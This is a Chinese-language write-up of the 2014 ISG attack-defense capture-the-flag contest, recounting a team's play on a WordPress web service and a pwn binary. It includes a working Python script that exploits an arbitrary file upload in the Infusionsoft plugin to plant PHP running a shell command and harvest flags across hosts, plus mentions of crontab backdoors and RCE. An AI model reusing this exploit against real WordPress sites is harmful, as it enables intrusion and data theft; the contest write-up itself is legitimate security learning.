【全网首发】2014 ISG信息安全技能竞赛writeup(通关攻略)

2014-11-03 01:27:25 阅读：31255次 点赞(0) 收藏 来源： ADoG A.K.A D3AdCa7

(2014-11-02 在上海交通大学信息安全学院举办的 2014 ISG信息安全技能竞赛 已落下帷幕，360播报平台第一时间收到第二名的获奖选手发来的现场Wirteup，以下内容供安全爱好者参考学习，本文获得投稿奖励500元，已打入作者账户，投稿请发送邮件至 huangyuan#360.cn)

小编点评：本文作者2014-11-02 01:00:00 在高铁上消耗200M流量投稿，这么拼也是醉了

一天半的比赛结束了，在最后被217逆袭干到了第二，真是惨惨惨> <，于是上一张比赛结束的分数榜。


这次的比赛是攻防形式，每个队伍维护一台gamebox，上面有两个服务，一个叫Pepper（Pwn题），一个叫Buggy（Web题），而且还有两个解题类的题目nuoman和pmty。

首先解释一下上图，红色愤怒的脸代表上一回合被别人拿走了flag，橙色的脸代表上一回合服务Down掉了但没有被拿flag，黄色的哭脸代表上回合即被别人拿了flag，而且服务还Down掉了（好惨）。粉色的脸代表上一回合服务正常且flag没有被拿走。

而这些图标对于后两个解题类的题目，则是粉色代表题目被解出，橙色代表题目未被解出。

而提交flag则是通过一个url提交，在get参数里提交自己的队伍token和拿到的flag，如下图：

提交成功返回correct，提交失败或者重复提交返回invalid。

两个解题类题目我没有碰，所以也不太熟悉，大概讲一下Pepper和Buggy吧。

Pepper是个32位的ELF文件，有多个漏洞，也有较为严格的checker，是个出的不错的题目。漏洞有栈溢出，堆溢出，格式化字符串，利用也是多种多样，我们的队长Kelwin更是搞出了五种利用方式，简直是花式Exp大师。更多的细节我也不清楚了，因为我主要负责的是Buggy（Web题目）的攻击和防御。

Buggy的主体是个Wordpress，一上来自带了两个插件，akismet和participants-database。其中前者被主办加入了一个后门（这个到结束都没有人发现并利用，结束后和主办方沟通时出题者说的），后者本身是个有漏洞的版本，可以用注入获取数据。

接下来就按照比赛的时间顺序讲讲过程和心得咯～

首先比赛开始的一个小时给大家部署网络，熟悉环境，分析服务。一个小时后网络互相联通大家可以相互攻击。Web方面我找到了那个SQL注入的漏洞，但用burpsuite的Repeater直接放包的时候没反应，相当奇怪。（这个在第一天比赛的晚上我发现原因了，因为之前乱搞的时候在burpsuite里配置了一个sock5代理，但比赛的gamebox显然是不允许外网访问的，所以包根本发不过去，蠢狗我）然后只是修补了这个SQL注入漏洞。

队友十分给力，网络联通的一霎那，拿下Pwn题一血，但主办网络貌似出了问题，而且貌似我们的攻击脚本一开始没写上自动提交，所以一开始吃了好多亏。

接下来能利用Pepper最简单漏洞的三个队：Dr.Mario, 217, Hackforfun开始迅速涨分，成为第一集团。

大概快中午的时候，常乐工地队（大三叶草威武）拿下Web题一血，狗我迅速抓到流量重放，也是能拿大概四个队伍（包括NPC）的flag，也是不太懂为啥这么简单的注入都不补（毕竟能google到的漏洞）。

然后就是枯燥的刷分时间，过一会儿大家基本反应过来了，漏洞也就补差不多了。


于是进入了Pepper的第二个小高潮，Kelwin写出堆溢出的利用，又帮我们攻城略地，拿下大量flag，同时我们发现217在他们pwn掉的gamebox上都留下了猥琐的crontab后门，于是我们两队也就开始了crontab的争夺战。

接下来Wordpress放出新的插件，portfolio-magic和infusionsoft。但狗我眼花只看到了一开始的portfolio-magic，分析了半天，也google了半天，愣是没找到漏洞，紧接着有队伍（记不清是哪一个了，貌似是我们旁边的石楠花boy们），开始迅速拿全场flag，我们赶紧抓了流量分析，才发现原来漏洞出在infusionsoft上，是个任意文件上传。于是迅速开始利用，一开始尝试过传个小马然后去看flag，但uploads目录大家都删的很快。于是改为直接上传一个php，内容是system(“cat /home/flag/buggy”);，然后迅速访问它。

附上小脚本 a.py:

import re
import requests
import urllib
import time
 
data = urllib.unquote('''fileTemplate=%3C%3Fphp%0A%09%09++++system%28%27cat+%2Fhome%2Fflag%2Fbuggy%27%29%3B%0A%09%09++++die%28%29%3B%0A%09%09++++class+Infusionsoft%7ETableName%7E+extends+NoTableCheckModel%7B%0A%0A%09%09++++%7D&fileNamePattern=%2Fvar%2Fwww%2Fwp-content%2Fuploads%2FDog%7ETableName%7E.php''')
 
h = {
    'Content-Type': 'application/x-www-form-urlencoded'
}
 
l = range(0,11)
ll = []
for i in l:
    if len(str(i)) == 1:
        ll.append('0' + str(i))
    else:
        ll.append(str(i))
 
while True:
    print ll
    for ip in ll:
        try:
            r = requests.post('http://100.64.1'+ ip + '.2/wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php',data=data, headers=h)
            r2 = requests.get('http://100.64.1'+ ip + '.2//wp-content/uploads/DogActionSequence.php')
            tmp =  r2.text.strip()
            r3 = requests.get('http://100.64.44.6/flag.php?token=abce313cb6bd7beb8131f97684f5d1bf&flag=' + tmp)
            print str(ip)+ ': ' + r3.text
        except:
            print str(ip) + ': failed!!'
            continue
    time.sleep(60)


然后打了一会大家也修的差不多，之后又是短暂的无聊期…

一段时间之后，主办方又放出新的两个插件wordpress-gallery-plugin和viral-sharing-buttons-by-up。这次的漏洞出在wordpress-gallery-plugin中的timthumb.php文件中，是今年六月爆出的一个RCE漏洞。但主办方把cache目录的权限配错了导致这个插件无法正常使用。和主板反映后他们修复了一下然后这个漏洞就能正常使用了。第一时间掏出脚本啪啪啪，大概能打六七个队的样子，然后就又渐渐少了。期间还想过用这个RCE来丢一个后门，但这个RCE的执行方式略蛋疼，于是作罢。

接下来就是晚上的离线分析，发现主办方改了Wordpress的version。于是伟大的cbmixx根据一些细节判断这个是4.0 stable版本，diff出了主办方加在Wordpress源码中的一个后门，并且grep了第一天的所有流量，发现竟然没人发现这个后门！接着又写好了利用脚本（膜拜cbmixx）。还讨论了如何规避grep或者tcp contains的检索，Cookie的保存，以及能否丢后门什么的。满足睡觉。

第二天来了之后补掉我们自己的漏洞之后开始打全场，发现admin账户无法登录，但可以登录包括NPC在内的8个队伍的isg账户，可以发发文章什么的，但没有任何权限。和主办方沟通，发现又是他们配置错误了，本来这个漏洞是让我们用来登录admin权限的后台然后看flag。但他们拒绝修复，于是这个0day相当于没用了，十分郁闷。

接下来也发生了一个尴尬的事情，我们和217在不停的争夺SHOU这个队伍的crontab的控制权，在217抢过去的一瞬间，SHOU修补了这个服务，于是我们就无法攻击他们的Pepper服务了，但217却因为后门能每回合独占他们flag的10分。于是217依靠着这每轮的10分，渐渐追上了我们。而且到比赛结束，SHOU都没能发现并清除217的后门，我们也是醉了…

后来又放了一次插件，分别是wp-attachments和download-shortcode，后者有个任意文件下载（伟大的google）。由于情况危机，狗我啪啪啪写出扫全场的Exp然后开打，第一回合除了隔壁的石楠花boy们也是手快补上了洞，别的队伍都可以拿到flag，我们迅速的涨了几轮分。但漏洞比较简单，大家也陆续修补并且攻击了起来，渐渐就没人能被拿flag了。


有个小插曲，因为大家的mysql账户密码都是可知的，于是217开始使用Pepper的shell来登录mysql读取Buggy的flag，我们根据pwningwall他们的行为猜了一下，也赶紧开始用Pepper的shell来读Buggy的flag。

后来因为有队伍吐槽，于是主办方把mysql弄成了root:root，但这难不倒我们，狗我从我的debian中扒拉出一个mysql的binary，丢给队友传了上去，继续通过Pepper来拿Buggy的flag。

但这儿我们可能犯了个错误，每次mysql用完我们都删掉然后重新下载，于是这样貌似对我们自己的gamebox造成了DoS攻击，导致我们的web服务down了一轮，我们-10， 全场其他队伍每个队伍+1，于是被217反超。接下来总觉得是有队伍在用扫描器之类的家伙扫我们，导致了我们的gamebox资源被消耗，于是最后一轮什么命令都无法执行（类似于被丢了fork bomb），导致有个关键的flag没能开启后门接收到，于是在最后一轮又比217少拿10分，最后以10.8分惜败给了217。


最后有个疑问，作为一个Web狗，我是很希望Web能出现在攻防竞赛中的。但由于tcpdump的存在，Web流量的重放过于简单。这导致一个队伍就算不自己挖Web漏洞，只要在被打的时候很快的反应过来，抓了0day立马重放，然后自己patch，十分优化。而挖0day的队伍投入了很多精力，但0day的效果却大打折扣（独占全场flag次数太少），综合起来感觉性价比十分低，所以我觉得一个好办法可能是在主办方处理流量的时候，把Web流量全部过滤出去，然后只给选手看access.log之类的？这样至少通过POST的一些攻击手法不会被迅速学去，也使得Web漏洞挖掘在攻防竞赛中有了比较大的重要程度。

如果你对攻防竞赛中的Web题目怎么出这个问题有很好的想法，欢迎和我交流：deadcat6464[at]gmail.com。
